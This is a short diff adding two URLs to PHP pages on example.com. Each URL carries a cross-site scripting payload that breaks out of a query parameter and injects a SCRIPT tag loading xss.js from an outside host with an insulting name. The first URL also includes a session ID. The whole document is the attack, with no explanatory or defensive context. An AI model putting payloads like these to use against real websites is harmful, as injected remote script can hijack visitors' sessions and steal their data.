@@ -1,0 +1,2 @@
+http://www.example.com/index2.php?pg=2&amp;item_id=11&amp;sort=review.id&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;&quot;&lt;&quot;&lt;&quot;&lt;&quot;&amp;order=DESC&amp;PHPSESSID=91c137efddf8844a26f5c57a8ca2d57d
+http://www.example.com/report.php?id=970&amp;item_id=251&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;&quot;&lt;&quot;&lt;&quot;&lt;&quot;
